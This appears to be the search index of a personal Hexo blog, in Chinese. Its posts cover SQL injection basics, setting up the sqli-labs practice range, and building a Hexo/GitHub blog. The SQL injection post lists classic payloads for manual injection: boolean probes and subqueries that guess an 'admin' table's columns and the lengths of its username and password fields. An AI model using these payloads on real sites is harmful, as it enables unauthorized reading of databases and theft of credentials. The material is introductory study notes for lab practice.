{"meta":{"title":"Hexo","subtitle":"","description":"","author":"Edmund0A","url":"https://Edmund0A.github.io","root":"/"},"pages":[{"title":"404","text":"","path":"404/index.html","date":"02-07","excerpt":""},{"title":"search","text":"","path":"search/index.html","date":"02-07","excerpt":""}],"posts":[{"title":"sql注入基础回头","text":"🔺⚪▲ 🔺sql注入的概念 sql注入是指应用对于使用者所输入的非法恶意语句的审查未经过判断或过滤不严，导致使用者刻意将恶意sql查询或添加语句输入参数中，通过欺骗数据库进行非授权的恶意查询，进行解析攻击。 🔺web三层架构的解析三层架构就是遵循符合“高内聚，低耦合”思想，将各个功能模块划分为表示层（UI）、业务逻辑层（BLL）和数据访问层（DAL）三层架构，各层之间采用接口相互访问，并通过对象模型的实体类作为数据传递的载体，不同的对象模型的实体类一般对应于数据库的不同表，实体类的属性与数据库表的字段名一致。（摘自百度百科词条） 🔺sql注入原理每当我们访问动态网页时, Web 服务器会向数据访问层发起 Sql 查询请求，如果权限验证通过就会执行 Sql 语句。结合用户的输入数据动态构造 Sql 语句，如果用户输入的数据被构造成恶意 Sql 代码，Web 应用又未对动态构造的 Sql 语句使用的参数进行审查，则会造成恶意语句的渗透，便是sql注入的基本形式。 ⚪sql注入影响▲ 攻击者不经授权便可获取到用户数据，借此盗取用户隐私信息；▲ 若网站拥有写入权限，攻击者甚至可以写入木马，对网站造成极大损害；▲ 攻击者拥有对其网站数据库的修改权限，可以肆意更改数据库中的内容；▲ 攻击者可以通过其他步骤获取到服务器的最高权限，并通过后门等方法，对服务器进行控制修改与操作。 ⚪sql注入常用语句▲ 判断是否存在注入点 1; and 1=1 and 1=2 ▲ 猜表 12and 0&lt;&gt;(select count(*) from *) and 0&lt;&gt;(select count(*) from admin) ---判断是否存在admin这张表 ▲ 猜帐号数目（如果遇到0&lt; 返回正确页面 1&lt;返回错误页面说明帐号数目就是1个 ） 12and 0&lt;(select count(*) from admin) and 1&lt;(select count(*) from admin) ▲ 猜解字段名称 （在len( ) 括号里面加上我们想到的字段名称. ） 123and 1=(select count(*) from admin where len(*)&gt;0)-- and 1=(select count(*) from admin where len(用户字段名称name)&gt;0) and 1=(select count(*) from admin where len(_blank&gt;密码字段名称password)&gt;0) ▲ 猜解各个字段的长度 （猜解长度就是把&gt;0变换 直到返回正确页面为止 ） 1234567and 1=(select count(*) from admin where len(*)&gt;0) and 1=(select count(*) from admin where len(name)&gt;6) 错误 and 1=(select count(*) from admin where len(name)&gt;5) 正确 长度是6 and 1=(select count(*) from admin where len(name)=6) 正确and 1=(select count(*) from admin where len(password)&gt;11) 正确 and 1=(select count(*) from admin where len(password)&gt;12) 错误 长度是12 and 1=(select count(*) from admin where len(password)=12) 正确","path":"2020/07/12/sql注入基础回头/","date":"07-12","excerpt":"","tags":[]},{"title":"SQL靶场的建立","text":"🔺SQL靶场搭建▲ 本次自学搭建sql靶场，使用前请自行配置好bitnami软件； ⚪下载安装靶场▲1. 进入页面下载靶场文件：SQLI靶场；▲2. 将靶场文件压缩包解压至bitnami软件目录下的WAMP中apache2的htdocs文件夹内。 ⚪靶场的基础设置与运行▲1. 【解压与设置】解压完毕后，进入 “sqli-labs-master”文件夹内的“sql-connerctions”文件夹，打开其中的“db-creds.inc” 文件进行编辑。在该文件我们可以看到一串代码： 12345678&lt;?php//give your mysql connection username n password$dbuser ='root';$dbpass ='root';$dbname =\"security\";$host = 'localhost';$dbname1 = \"challenges\";?&gt; 选定其中$dbuser =&#39;root&#39;;项，将 root 替换为你所要设置的用户名。选定其中$dbpass =&#39;root&#39;;项，将 root 替换为你所要设置的密码。设置完密码后，保存并关闭；▲2. 【初步运行】在bitnami文件源目录下，打开manager-windows.exe文件，选择Open phpMyAdmin选项，进入页面，输入上一步所设置的用户名和密码，确认后登陆成功即可以关闭页面。▲3. 【开始使用】此时，进入sqli-labs-master文件夹内，选择index.html即可成功进入靶场，开始攻克难关！","path":"2020/03/29/SQL靶场的建立/","date":"03-29","excerpt":"","tags":[]},{"title":"本人的首次搭建hexo+github博客","text":"🔺组件准备步骤⚪node的安装▲进入node官网选择下载长期支持版； ▲下载后自行选择路径并安装。 ⚪注册一个GitHub账号▲进入GitHub官网，按照注册提示进行注册；▲在邮箱验证后，进入网址创建页面；▲在“Repository name”处填入自己的博客网址，格式为用户名.github.io(在用户名处填入自己注册账号时所用的用户名)，GitHub帐号注册步骤基本完成； ⚪git for windows组件的安装▲进入git官网，并在官网首页选择download下载安装包；▲下载安装包后，自行选择安装路径后执行安装，除安装时有两点需要注意外，其他建议都保持默认设置；※注意！安装到该步骤后勾选下方选项：Don’t creat a Start Menu folder；※注意！安装到该步骤后选择第二项Use Windows’ default console window； ▲至此，git安装步骤完成。 🔺设置配置⚪githubSHH的配置▲在git的安装目录处运行git-bash.exe运行界面如下：▲输入各种组件命令后回车安装组件（Github的注册邮箱地址即注册账号时的验证邮箱）；▲连续两次回车跳过设置密匙并形成密匙阵列；▲将命令窗口最小化后进入GitHub官网后进入个人的setting页面更改其他设置；▲按图选择SSH and GPG keys选项，并点击New SSH key；▲Title处填入自己的用户名，Key处填入用记事本方式打开的C:\\Users\\DELL.ssh路径的id_rsa.pub文件内的所有内容；▲至此，SSH配置完成。 ⚪Hexo的配置▲进入Hexo官网，可以发现官网首页的安装命令；▲在想要安装Hexo组件的盘中新建一个名为“blog”的文件夹，并在该blog文件夹内呼出cmd程序，并将事先打开的Hexo官网首页的安装命令复制到cmd运行框内并运行安装；▲安装后再输入hexo init +博客名指令进行初始化；▲初始化完成后，在运行框内输入cd +博客名进入博客，并输入npm install指令，回车安装；▲安装完成后，输入hexo s -p 5555（此处选择555端口），运行结束后就可以在localhost:5555地址看到自己的博客了。 🔺其他组件⚪自行安装sublime并按照博客主题修改设置。🔺至此，博客搭建完成。","path":"2020/02/15/本人的首次搭建hexo+github博客/","date":"02-15","excerpt":"","tags":[]},{"title":"Hello World","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new \"My New Post\" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","path":"2020/02/07/hello-world/","date":"02-07","excerpt":"","tags":[]}]}